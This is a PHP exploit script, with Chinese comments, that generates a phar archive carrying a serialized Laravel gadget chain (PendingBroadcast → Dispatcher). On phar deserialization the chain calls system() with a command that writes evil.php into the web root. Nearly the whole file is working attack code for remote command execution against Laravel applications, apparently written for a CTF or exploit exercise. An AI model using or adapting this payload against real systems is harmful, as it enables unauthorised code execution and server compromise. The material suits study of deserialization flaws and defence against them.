<?php

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        function __construct($events, $parameter)
        {
            $this->events = $events;
            $this->event = $parameter;
        }
    }
}
namespace Illuminate\Events
{
    class Dispatcher
    {
        protected $listeners;

        function __construct($function, $parameter)
        {
            $this->listeners = [
                $parameter => [$function]
            ];
        }
    }
}
namespace{
    $b = new Illuminate\Events\Dispatcher('system','echo 1 > /var/www/html/public/evil.php');
    $a = new Illuminate\Broadcasting\PendingBroadcast($b,'echo 1 > /var/www/html/public/evil.php');
    // echo base64_encode(serialize($a));

    $phar = new Phar("phar.phar"); 
    // $phar = $phar->convertToExecutable(Phar::TAR,Phar::GZ); //会生成phar.phar.tar.gz
    // $phar = $phar->convertToExecutable(Phar::TAR); //会生成phar.phar.tar
    // $phar = $phar->convertToExecutable(Phar::TAR,Phar::BZ2);//会生成phar.phar.tar.bz2
    // $phar = $phar->convertToExecutable(Phar::ZIP);//会生成phar.phar.zip

    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    
    $phar->setMetadata($a); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
}
